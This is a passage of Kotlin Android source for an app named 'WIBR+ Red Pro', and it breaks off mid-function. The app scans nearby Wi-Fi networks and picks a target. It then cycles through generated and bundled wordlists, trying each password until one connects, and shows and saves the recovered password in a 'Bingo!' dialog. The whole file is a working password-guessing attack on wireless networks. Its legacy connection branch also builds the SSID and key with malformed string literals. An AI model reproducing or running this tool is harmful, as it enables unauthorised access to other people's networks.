package com.example.redwibrpro

import android.Manifest
import android.annotation.SuppressLint
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.net.ConnectivityManager
import android.net.LinkProperties
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.net.wifi.WifiNetworkSpecifier
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.BorderStroke
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.clickable
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Job
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

data class ScannedWifiNetwork(
    val ssid: String,
    val bssid: String,
    val capabilities: String,
    val signalPercent: Int
)

data class SavedNetworkEntry(
    val ssid: String,
    val password: String,
    val savedAt: String
)

data class DictionarySource(
    val id: String,
    val title: String,
    val words: List<String>,
    val selected: Boolean = false,
    val removable: Boolean = false
)

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        createSuccessNotificationChannel(this)
        setContent {
            val darkRedScheme = darkColorScheme(
                primary = Color(0xFFFF3B30),
                onPrimary = Color.White,
                primaryContainer = Color(0xFF4A0E0E),
                onPrimaryContainer = Color.White,
                secondary = Color(0xFFE53935),
                onSecondary = Color.White,
                background = Color(0xFF121212),
                onBackground = Color.White,
                surface = Color(0xFF232325),
                onSurface = Color.White
            )

            MaterialTheme(colorScheme = darkRedScheme) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = MaterialTheme.colorScheme.background
                ) {
                    RedWibrProApp()
                }
            }
        }
    }
}

@Composable
fun RedWibrProApp() {
    val context = LocalContext.current
    val scope = rememberCoroutineScope()

    val redAccent = Color(0xFFFF3B30)
    val darkBg = Color(0xFF121212)
    val panelColor = Color(0xFF232325)

    var currentTab by remember { mutableIntStateOf(0) }

    var targetSsid by remember { mutableStateOf("") }
    var targetBssid by remember { mutableStateOf("00:00:00:00:00:00") }
    var targetEncryption by remember { mutableStateOf("[WPA2-PSK]") }
    var targetSignal by remember { mutableIntStateOf(0) }

    var searchQuery by remember { mutableStateOf("") }
    var scannedNetworks by remember { mutableStateOf<List<ScannedWifiNetwork>>(emptyList()) }
    var scanSummary by remember { mutableStateOf("Tap REFRESH to scan") }

    val smallAssetWords = remember { loadAssetWordlist(context, "small_wordlist.txt") }
    val patternAssetWords = remember { loadAssetWordlist(context, "common_patterns.txt") }

    var dictionaries by remember {
        mutableStateOf(
            listOf(
                DictionarySource("bruteforce", "Bruteforce", generateNumericPatterns(), selected = false, removable = false),
                DictionarySource("small", "Small Dictionary", smallAssetWords, selected = true, removable = true),
                DictionarySource("middle", "Middle Dictionary", patternAssetWords + smallAssetWords, selected = false, removable = true),
                DictionarySource("big", "Big Dictionary", (smallAssetWords + patternAssetWords + generateNumericPatterns()).distinct(), selected = false, removable = true)
            )
        )
    }

    var intervalSeconds by remember { mutableIntStateOf(7) }
    var queueWords by remember { mutableStateOf(smallAssetWords) }

    var isRunning by remember { mutableStateOf(false) }
    var currentIndex by remember { mutableIntStateOf(0) }
    var currentPassword by remember { mutableStateOf(queueWords.firstOrNull() ?: "12345678") }
    var statusBanner by remember { mutableStateOf("Ready") }
    var networkSummary by remember { mutableStateOf(inspectNetworkState(context)) }
    var lastIpAddress by remember { mutableStateOf("-") }
    var elapsedSeconds by remember { mutableIntStateOf(0) }

    var bingoDialogData by remember { mutableStateOf<Pair<String, String>?>(null) }

    var savedNetworks by remember {
        mutableStateOf(loadSavedNetworks(context))
    }

    var activeCallback by remember { mutableStateOf<ConnectivityManager.NetworkCallback?>(null) }
    var runnerJob by remember { mutableStateOf<Job?>(null) }

    val requiredPermissions = remember {
        buildList {
            add(Manifest.permission.ACCESS_FINE_LOCATION)
            add(Manifest.permission.ACCESS_COARSE_LOCATION)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                add(Manifest.permission.NEARBY_WIFI_DEVICES)
                add(Manifest.permission.POST_NOTIFICATIONS)
            }
        }.toTypedArray()
    }

    fun triggerRealWifiScan() {
        val list = performRealWifiScan(context)
        scannedNetworks = list
        networkSummary = inspectNetworkState(context)
        scanSummary = "Found ${list.size} APs"
        if (targetSsid.isBlank() && list.isNotEmpty()) {
            val first = list.first()
            targetSsid = first.ssid
            targetBssid = first.bssid
            targetEncryption = first.capabilities
            targetSignal = first.signalPercent
        }
    }

    val permissionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.RequestMultiplePermissions()
    ) {
        triggerRealWifiScan()
        statusBanner = "Ready"
    }

    val filePickerLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.OpenDocument()
    ) { uri: Uri? ->
        if (uri != null) {
            val loaded = readWordlistFromUri(context, uri)
            if (loaded.isNotEmpty()) {
                val fileName = uri.lastPathSegment?.substringAfterLast('/') ?: "custom_wordlist.txt"
                dictionaries = dictionaries + DictionarySource(
                    id = "file_${System.currentTimeMillis()}",
                    title = fileName,
                    words = loaded,
                    selected = true,
                    removable = true
                )
                queueWords = loaded
                currentIndex = 0
                currentPassword = loaded.first()
                statusBanner = "Loaded ${loaded.size} words"
            } else {
                statusBanner = "Empty file"
            }
        }
    }

    fun cleanupCallback() {
        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        activeCallback?.let { cb ->
            runCatching { cm.unregisterNetworkCallback(cb) }
        }
        activeCallback = null
    }

    fun stopRunner(newStatus: String = "Paused") {
        runnerJob?.cancel()
        runnerJob = null
        cleanupCallback()
        isRunning = false
        statusBanner = newStatus
        networkSummary = inspectNetworkState(context)
    }

    fun saveSuccessfulConnection(ssid: String, password: String) {
        val stamp = SimpleDateFormat("yyyy/MM/dd hh:mm:ss a", Locale.getDefault()).format(Date())
        val updated = listOf(SavedNetworkEntry(ssid, password, stamp)) +
            savedNetworks.filterNot { it.ssid == ssid && it.password == password }
        savedNetworks = updated
        persistSavedNetworks(context, updated)
    }

    @Suppress("DEPRECATION")
    fun attemptSingleWifiConnection(
        ssid: String,
        password: String,
        onConnected: () -> Unit,
        onFailed: () -> Unit
    ) {
        cleanupCallback()

        if (ssid.isBlank()) {
            onFailed()
            return
        }

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
            if (wifiManager == null) {
                onFailed()
                return
            }
            runCatching {
                val conf = WifiConfiguration()
                conf.SSID = """ + ssid + """
                if (password.isNotEmpty()) {
                    conf.preSharedKey = """ + password + """
                } else {
                    conf.allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)
                }
                val netId = wifiManager.addNetwork(conf)
                if (netId != -1) {
                    wifiManager.disconnect()
                    wifiManager.enableNetwork(netId, true)
                    wifiManager.reconnect()
                } else {
                    onFailed()
                }
            }.onFailure {
                onFailed()
            }
            return
        }

        val cm = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        val specifierBuilder = WifiNetworkSpecifier.Builder().setSsid(ssid)
        if (password.isNotEmpty()) {
            specifierBuilder.setWpa2Passphrase(password)
        }

        val request = NetworkRequest.Builder()
            .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
            .removeCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .setNetworkSpecifier(specifierBuilder.build())
            .build()

        var settled = false
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                if (!settled) {
                    settled = true
                    onConnected()
                }
            }

            override fun onLinkPropertiesChanged(network: Network, linkProperties: LinkProperties) {
                val ip = linkProperties.linkAddresses.firstOrNull()?.address?.hostAddress
                if (!ip.isNullOrBlank()) {
                    lastIpAddress = ip
                }
            }

            override fun onUnavailable() {
                if (!settled) {
                    settled = true
                    onFailed()
                }
            }

            override fun onLost(network: Network) {
                networkSummary = inspectNetworkState(context)
            }
        }

        activeCallback = callback
        runCatching {
            cm.requestNetwork(request, callback)
        }.onFailure {
            if (!settled) {
                settled = true
                onFailed()
            }
        }
    }

    fun startWordlistSequence() {
        val words = if (queueWords.isNotEmpty()) {
            queueWords
        } else {
            dictionaries.firstOrNull { it.selected }?.words ?: smallAssetWords
        }

        if (words.isEmpty() || targetSsid.isBlank()) {
            statusBanner = "Select SSID & list"
            return
        }

        stopRunner("Running")
        isRunning = true
        elapsedSeconds = 0
        currentTab = 3

        runnerJob = scope.launch {
            var idx = currentIndex.coerceIn(0, words.lastIndex)
            while (isRunning && idx < words.size) {
                val candidate = words[idx]
                currentIndex = idx
                currentPassword = candidate
                statusBanner = "Trying ${idx + 1} of ${words.size}"
                networkSummary = inspectNetworkState(context)

                var connectedNow = false
                attemptSingleWifiConnection(
                    ssid = targetSsid,
                    password = candidate,
                    onConnected = { connectedNow = true },
                    onFailed = {}
                )

                val waitMs = intervalSeconds.coerceAtLeast(1) * 1000L
                val stepMs = 500L
                var waited = 0L
                while (isRunning && !connectedNow && waited < waitMs) {
                    delay(stepMs)
                    waited += stepMs
                    if (waited % 1000L == 0L) {
                        elapsedSeconds += 1
                    }
                }

                if (connectedNow) {
                    cleanupCallback()
                    isRunning = false
                    statusBanner = "Connected!"
                    saveSuccessfulConnection(targetSsid, candidate)
                    sendSuccessNotification(context, targetSsid, candidate)
                    bingoDialogData = targetSsid to candidate
                    networkSummary = inspectNetworkState(context)
                    break
                }

                cleanupCallback()
                idx++
                if (idx >= words.size) {
                    isRunning = false
                    statusBanner = "Done"
                    break
                }
            }
        }
    }

    DisposableEffect(context) {
        val receiver = object : BroadcastReceiver() {
            override fun onReceive(ctx: Context?, intent: Intent?) {
                if (intent?.action == WifiManager.SCAN_RESULTS_AVAILABLE_ACTION) {
                    val updated = readScanResultsOnly(context)
                    if (updated.isNotEmpty()) {
                        scannedNetworks = updated
                        scanSummary = "Found ${updated.size} APs"
                    }
                }
            }
        }
        val filter = IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            context.registerReceiver(receiver, filter, Context.RECEIVER_NOT_EXPORTED)
        } else {
            @Suppress("UnspecifiedRegisterReceiverFlag")
            context.registerReceiver(receiver, filter)
        }

        triggerRealWifiScan()

        onDispose {
            runCatching { context.unregisterReceiver(receiver) }
            runnerJob?.cancel()
            cleanupCallback()
        }
    }

    bingoDialogData?.let { (winSsid, winPass) ->
        AlertDialog(
            onDismissRequest = { bingoDialogData = null },
            containerColor = panelColor,
            shape = MaterialTheme.shapes.small,
            modifier = Modifier.border(2.dp, redAccent, MaterialTheme.shapes.small),
            title = {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Box(
                        modifier = Modifier
                            .size(30.dp)
                            .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall)
                            .background(darkBg),
                        contentAlignment = Alignment.Center
                    ) {
                        Text("W+", color = redAccent, fontSize = 14.sp, fontWeight = FontWeight.ExtraBold)
                    }
                    Spacer(modifier = Modifier.width(10.dp))
                    Text(
                        text = "Bingo!",
                        color = redAccent,
                        fontSize = 22.sp,
                        fontWeight = FontWeight.Bold
                    )
                }
            },
            text = {
                Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
                    Text("SSID: $winSsid", color = Color.White, fontSize = 17.sp, fontWeight = FontWeight.SemiBold)
                    Text("Password: $winPass", color = redAccent, fontSize = 17.sp, fontWeight = FontWeight.Bold)
                }
            },
            confirmButton = {
                Button(
                    onClick = { bingoDialogData = null },
                    colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White)
                ) {
                    Text("OK")
                }
            }
        )
    }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(darkBg)
    ) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 14.dp, vertical = 10.dp),
            verticalAlignment = Alignment.CenterVertically,
            horizontalArrangement = Arrangement.SpaceBetween
        ) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Box(
                    modifier = Modifier
                        .size(34.dp)
                        .border(1.5.dp, redAccent, MaterialTheme.shapes.extraSmall)
                        .background(panelColor),
                    contentAlignment = Alignment.Center
                ) {
                    Text("W+", color = redAccent, fontSize = 17.sp, fontWeight = FontWeight.ExtraBold)
                }
                Spacer(modifier = Modifier.width(8.dp))
                Text("WIBR+ Red Pro", color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.SemiBold)
            }

            Row(horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                Text(
                    text = "PERMS",
                    color = redAccent,
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.clickable {
                        permissionLauncher.launch(requiredPermissions)
                    }
                )
                Text(
                    text = "STOP",
                    color = Color.White,
                    fontSize = 13.sp,
                    fontWeight = FontWeight.Bold,
                    modifier = Modifier.clickable {
                        stopRunner("Stopped")
                    }
                )
            }
        }

        HorizontalDivider(thickness = 2.dp, color = redAccent)

        ScrollableTabRow(
            selectedTabIndex = currentTab,
            containerColor = panelColor,
            contentColor = redAccent,
            edgePadding = 8.dp
        ) {
            Tab(selected = currentTab == 0, onClick = { currentTab = 0 }, text = { Text("Home / Saved", fontSize = 13.sp) })
            Tab(selected = currentTab == 1, onClick = { currentTab = 1 }, text = { Text("Networks", fontSize = 13.sp) })
            Tab(selected = currentTab == 2, onClick = { currentTab = 2 }, text = { Text("Dictionaries", fontSize = 13.sp) })
            Tab(selected = currentTab == 3, onClick = { currentTab = 3 }, text = { Text("Live Test", fontSize = 13.sp) })
        }

        when (currentTab) {
            0 -> SavedNetworksScreen(
                savedList = savedNetworks,
                redAccent = redAccent,
                panelColor = panelColor,
                onGoToScan = {
                    triggerRealWifiScan()
                    currentTab = 1
                },
                onAddNetwork = { ssid, pass ->
                    if (ssid.isNotBlank()) {
                        saveSuccessfulConnection(ssid.trim(), pass.trim())
                        statusBanner = "Saved"
                    }
                },
                onDeleteEntry = { entry ->
                    val updated = savedNetworks.filterNot { it == entry }
                    savedNetworks = updated
                    persistSavedNetworks(context, updated)
                },
                onConnectSaved = { entry ->
                    targetSsid = entry.ssid
                    currentPassword = entry.password
                    currentTab = 3
                    statusBanner = "Trying saved"
                    attemptSingleWifiConnection(
                        ssid = entry.ssid,
                        password = entry.password,
                        onConnected = {
                            statusBanner = "Connected!"
                            sendSuccessNotification(context, entry.ssid, entry.password)
                            bingoDialogData = entry.ssid to entry.password
                        },
                        onFailed = {
                            statusBanner = "Failed"
                        }
                    )
                }
            )

            1 -> NetworksScanScreen(
                networks = scannedNetworks,
                searchQuery = searchQuery,
                selectedSsid = targetSsid,
                statusNote = scanSummary,
                redAccent = redAccent,
                panelColor = panelColor,
                onSearchChange = { searchQuery = it },
                onRefresh = {
                    val hasPerm = requiredPermissions.all {
                        ContextCompat.checkSelfPermission(context, it) == PackageManager.PERMISSION_GRANTED
                    }
                    if (!hasPerm) {
                        permissionLauncher.launch(requiredPermissions)
                    } else {
                        triggerRealWifiScan()
                    }
                },
                onSelectNetwork = { net ->
                    targetSsid = net.ssid
                    targetBssid = net.bssid
                    targetEncryption = net.capabilities
                    targetSignal = net.signalPercent
                    statusBanner = "Ready"
                    currentTab = 2
                }
            )

            2 -> DictionariesScreen(
                dictionaries = dictionaries,
                intervalSeconds = intervalSeconds,
                redAccent = redAccent,
                panelColor = panelColor,
                onToggleSelect = { id ->
                    dictionaries = dictionaries.map {
                        if (it.id == id) it.copy(selected = !it.selected) else it
                    }
                },
                onDeleteDict = { id ->
                    dictionaries = dictionaries.filterNot { it.id == id }
                },
                onAddFromStorage = {
                    filePickerLauncher.launch(arrayOf("text/plain", "*/*"))
                },
                onIntervalChange = { intervalSeconds = it },
                onAddToQueue = {
                    val merged = dictionaries.filter { it.selected }.flatMap { it.words }.distinct()
                    if (merged.isNotEmpty()) {
                        queueWords = merged
                        currentIndex = 0
                        currentPassword = merged.first()
                        statusBanner = "Trying 1 of ${merged.size}"
                        currentTab = 3
                    }
                }
            )

            3 -> LiveTestScreen(
                statusBanner = statusBanner,
                isRunning = isRunning,
                ssid = targetSsid,
                bssid = targetBssid,
                encryption = targetEncryption,
                currentPassword = currentPassword,
                currentIndex = currentIndex,
                totalCount = queueWords.size.coerceAtLeast(1),
                intervalSeconds = intervalSeconds,
                elapsedSeconds = elapsedSeconds,
                signalPercent = targetSignal,
                networkSummary = networkSummary,
                ipAddress = lastIpAddress,
                redAccent = redAccent,
                panelColor = panelColor,
                onSsidChange = { targetSsid = it },
                onPasswordChange = { currentPassword = it },
                onStartOrPause = {
                    if (isRunning) {
                        stopRunner("Paused")
                    } else {
                        startWordlistSequence()
                    }
                },
                onTestSingleNow = {
                    statusBanner = "Trying ${currentIndex + 1} of ${queueWords.size.coerceAtLeast(1)}"
                    attemptSingleWifiConnection(
                        ssid = targetSsid,
                        password = currentPassword,
                        onConnected = {
                            statusBanner = "Connected!"
                            saveSuccessfulConnection(targetSsid, currentPassword)
                            sendSuccessNotification(context, targetSsid, currentPassword)
                            bingoDialogData = targetSsid to currentPassword
                        },
                        onFailed = {
                            statusBanner = "Failed"
                        }
                    )
                }
            )
        }
    }
}

@Composable
private fun NetworksScanScreen(
    networks: List<ScannedWifiNetwork>,
    searchQuery: String,
    selectedSsid: String,
    statusNote: String,
    redAccent: Color,
    panelColor: Color,
    onSearchChange: (String) -> Unit,
    onRefresh: () -> Unit,
    onSelectNetwork: (ScannedWifiNetwork) -> Unit
) {
    val filtered = remember(networks, searchQuery) {
        if (searchQuery.isBlank()) networks
        else networks.filter {
            it.ssid.contains(searchQuery, ignoreCase = true) ||
                it.bssid.contains(searchQuery, ignoreCase = true)
        }
    }

    Column(modifier = Modifier.fillMaxSize()) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFF1A1A1C))
                .padding(horizontal = 14.dp, vertical = 10.dp),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(statusNote, color = Color.White, fontSize = 15.sp, fontWeight = FontWeight.SemiBold)
            Text(
                text = "REFRESH",
                color = redAccent,
                fontSize = 14.sp,
                fontWeight = FontWeight.Bold,
                modifier = Modifier.clickable { onRefresh() }
            )
        }

        OutlinedTextField(
            value = searchQuery,
            onValueChange = onSearchChange,
            label = { Text("Search SSID / BSSID", color = redAccent) },
            singleLine = true,
            modifier = Modifier
                .fillMaxWidth()
                .padding(horizontal = 12.dp, vertical = 6.dp)
        )

        if (filtered.isEmpty()) {
            Box(
                modifier = Modifier
                    .fillMaxSize()
                    .padding(20.dp),
                contentAlignment = Alignment.Center
            ) {
                Text(
                    text = "Tap PERMS then REFRESH",
                    color = Color.LightGray,
                    fontSize = 14.sp,
                    textAlign = TextAlign.Center
                )
            }
        } else {
            LazyColumn(
                modifier = Modifier.fillMaxSize(),
                contentPadding = PaddingValues(12.dp),
                verticalArrangement = Arrangement.spacedBy(10.dp)
            ) {
                items(filtered) { net ->
                    val isSelected = net.ssid == selectedSsid
                    Column(
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(panelColor)
                            .border(
                                width = if (isSelected) 1.5.dp else 1.dp,
                                color = if (isSelected) redAccent else Color(0xFF333336)
                            )
                            .clickable { onSelectNetwork(net) }
                            .padding(12.dp)
                    ) {
                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.SpaceBetween
                        ) {
                            Text(net.ssid, color = redAccent, fontSize = 18.sp, fontWeight = FontWeight.Bold)
                            Text("${net.signalPercent}%", color = Color.White, fontSize = 13.sp)
                        }
                        Spacer(modifier = Modifier.height(4.dp))
                        Text(net.bssid, color = Color.Gray, fontSize = 12.sp)
                        Text(net.capabilities, color = redAccent.copy(alpha = 0.85f), fontSize = 13.sp)
                        Spacer(modifier = Modifier.height(6.dp))
                        LinearProgressIndicator(
                            progress = { (net.signalPercent / 100f).coerceIn(0.05f, 1f) },
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(6.dp),
                            color = redAccent,
                            trackColor = Color(0xFF3A3A3D)
                        )
                    }
                }
            }
        }
    }
}

@Composable
private fun DictionariesScreen(
    dictionaries: List<DictionarySource>,
    intervalSeconds: Int,
    redAccent: Color,
    panelColor: Color,
    onToggleSelect: (String) -> Unit,
    onDeleteDict: (String) -> Unit,
    onAddFromStorage: () -> Unit,
    onIntervalChange: (Int) -> Unit,
    onAddToQueue: () -> Unit
) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(12.dp),
        verticalArrangement = Arrangement.SpaceBetween
    ) {
        LazyColumn(
            modifier = Modifier.weight(1f),
            verticalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            items(dictionaries, key = { it.id }) { dict ->
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(panelColor)
                        .border(1.dp, if (dict.selected) redAccent else Color(0xFF343438))
                        .padding(horizontal = 10.dp, vertical = 8.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Row(
                        verticalAlignment = Alignment.CenterVertically,
                        modifier = Modifier
                            .weight(1f)
                            .clickable { onToggleSelect(dict.id) }
                    ) {
                        Checkbox(
                            checked = dict.selected,
                            onCheckedChange = { onToggleSelect(dict.id) },
                            colors = CheckboxDefaults.colors(checkedColor = redAccent, uncheckedColor = redAccent)
                        )
                        Spacer(modifier = Modifier.width(6.dp))
                        Column {
                            Text(dict.title, color = redAccent, fontSize = 16.sp, fontWeight = FontWeight.Medium)
                            Text("${dict.words.size}", color = Color.LightGray, fontSize = 12.sp)
                        }
                    }

                    if (dict.removable) {
                        Box(
                            modifier = Modifier
                                .size(38.dp)
                                .background(Color(0xFF38383C))
                                .clickable { onDeleteDict(dict.id) },
                            contentAlignment = Alignment.Center
                        ) {
                            Text("DEL", color = redAccent, fontSize = 11.sp, fontWeight = FontWeight.Bold)
                        }
                    }
                }
            }

            item {
                Spacer(modifier = Modifier.height(6.dp))
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(panelColor)
                        .padding(12.dp),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Text("Delay: ${intervalSeconds}s", color = redAccent, fontSize = 15.sp)
                    Row(horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Button(
                            onClick = { if (intervalSeconds > 3) onIntervalChange(intervalSeconds - 1) },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF38383C), contentColor = Color.White)
                        ) { Text("-") }
                        Button(
                            onClick = { onIntervalChange(intervalSeconds + 1) },
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF38383C), contentColor = Color.White)
                        ) { Text("+") }
                    }
                }
            }
        }

        Spacer(modifier = Modifier.height(10.dp))

        Column(verticalArrangement = Arrangement.spacedBy(8.dp)) {
            Button(
                onClick = onAddFromStorage,
                shape = MaterialTheme.shapes.extraSmall,
                colors = ButtonDefaults.buttonColors(containerColor = panelColor, contentColor = redAccent),
                modifier = Modifier
                    .fillMaxWidth()
                    .height(46.dp)
            ) {
                Text("Add Dictionary (.txt)", fontSize = 16.sp, fontWeight = FontWeight.Medium)
            }

            Button(
                onClick = onAddToQueue,
                shape = MaterialTheme.shapes.extraSmall,
                colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White),
                modifier = Modifier
                    .fillMaxWidth()
                    .height(48.dp)
            ) {
                Text("Start Queue", fontSize = 16.sp, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
private fun LiveTestScreen(
    statusBanner: String,
    isRunning: Boolean,
    ssid: String,
    bssid: String,
    encryption: String,
    currentPassword: String,
    currentIndex: Int,
    totalCount: Int,
    intervalSeconds: Int,
    elapsedSeconds: Int,
    signalPercent: Int,
    networkSummary: String,
    ipAddress: String,
    redAccent: Color,
    panelColor: Color,
    onSsidChange: (String) -> Unit,
    onPasswordChange: (String) -> Unit,
    onStartOrPause: () -> Unit,
    onTestSingleNow: () -> Unit
) {
    val progress = ((currentIndex + 1).toFloat() / totalCount.coerceAtLeast(1).toFloat()).coerceIn(0f, 1f)
    val scrollState = rememberScrollState()

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(horizontal = 16.dp, vertical = 10.dp),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(
            text = statusBanner,
            color = redAccent,
            fontSize = 20.sp,
            fontWeight = FontWeight.Bold,
            textAlign = TextAlign.Center
        )

        Spacer(modifier = Modifier.height(8.dp))

        OutlinedTextField(
            value = ssid,
            onValueChange = onSsidChange,
            label = { Text("SSID", color = redAccent) },
            singleLine = true,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(modifier = Modifier.height(8.dp))

        OutlinedTextField(
            value = currentPassword,
            onValueChange = onPasswordChange,
            label = { Text("Password", color = redAccent) },
            singleLine = true,
            modifier = Modifier.fillMaxWidth()
        )

        Spacer(modifier = Modifier.height(8.dp))

        if (isRunning) {
            CircularProgressIndicator(
                color = Color.White,
                trackColor = Color.DarkGray,
                modifier = Modifier.size(26.dp),
                strokeWidth = 2.5.dp
            )
            Spacer(modifier = Modifier.height(8.dp))
        }

        Column(
            modifier = Modifier
                .weight(1f)
                .fillMaxWidth()
                .verticalScroll(scrollState),
            horizontalAlignment = Alignment.CenterHorizontally
        ) {
            Text("BSSID: $bssid", color = redAccent, fontSize = 14.sp)
            Text("Encryption: $encryption", color = redAccent, fontSize = 13.sp)

            Spacer(modifier = Modifier.height(10.dp))

            LinearProgressIndicator(
                progress = { progress },
                modifier = Modifier
                    .fillMaxWidth()
                    .height(3.dp),
                color = redAccent,
                trackColor = Color(0xFF2C2C2E)
            )

            Spacer(modifier = Modifier.height(10.dp))

            Column(
                modifier = Modifier.fillMaxWidth(),
                verticalArrangement = Arrangement.spacedBy(6.dp)
            ) {
                StatLine("Password:", "${currentIndex + 1} of $totalCount", redAccent)
                StatLine("Step duration:", "$intervalSeconds sec", redAccent)
                StatLine("Elapsed time:", "${elapsedSeconds}s", redAccent)
                StatLine("Signal level:", "$signalPercent", redAccent)
                StatLine("System status:", networkSummary, redAccent)
                StatLine("IP Address:", ipAddress, redAccent)
            }
        }

        Spacer(modifier = Modifier.height(8.dp))

        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(10.dp)
        ) {
            Button(
                onClick = onStartOrPause,
                shape = MaterialTheme.shapes.extraSmall,
                colors = ButtonDefaults.buttonColors(containerColor = panelColor, contentColor = redAccent),
                modifier = Modifier
                    .weight(1f)
                    .height(48.dp)
            ) {
                Text(if (isRunning) "Pause" else "Start (${intervalSeconds}s)", fontSize = 16.sp, fontWeight = FontWeight.Bold)
            }

            Button(
                onClick = onTestSingleNow,
                shape = MaterialTheme.shapes.extraSmall,
                colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White),
                modifier = Modifier
                    .weight(1f)
                    .height(48.dp)
            ) {
                Text("Try Now", fontSize = 16.sp, fontWeight = FontWeight.Bold)
            }
        }
    }
}

@Composable
private fun SavedNetworksScreen(
    savedList: List<SavedNetworkEntry>,
    redAccent: Color,
    panelColor: Color,
    onGoToScan: () -> Unit,
    onAddNetwork: (String, String) -> Unit,
    onDeleteEntry: (SavedNetworkEntry) -> Unit,
    onConnectSaved: (SavedNetworkEntry) -> Unit
) {
    var showAddForm by remember { mutableStateOf(false) }
    var newSsid by remember { mutableStateOf("") }
    var newPass by remember { mutableStateOf("") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(12.dp),
        verticalArrangement = Arrangement.spacedBy(10.dp)
    ) {
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.spacedBy(8.dp)
        ) {
            Button(
                onClick = onGoToScan,
                shape = MaterialTheme.shapes.extraSmall,
                colors = ButtonDefaults.buttonColors(containerColor = redAccent, contentColor = Color.White),
                modifier = Modifier
                    .weight(1f)
                    .height(46.dp)
            ) {
                Text("Scan APs", fontSize = 15.sp, fontWeight = FontWeight.Bold)
            }

            Button(
                onClick = { showAddForm = !showAddForm },
                shape = MaterialTheme.shapes.extraSmall,
                colors = ButtonDefaults.buttonColors(containerColor = panelColor, contentColor = redAccent),
                modifier = Modifier
                    .weight(1f)
                    .height(46.dp)
            ) {
                Text(if (showAddForm) "Close" else "Manual", fontSize = 15.sp, fontWeight = FontWeight.Bold)
            }
        }

        if (showAddForm) {
            Column(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(panelColor)
                    .border(BorderStroke(1.dp, redAccent))
                    .padding(10.dp),
                verticalArrangement = Arrangement.spacedBy(8.dp)
            ) {
                OutlinedTextField(
                    value = newSsid,
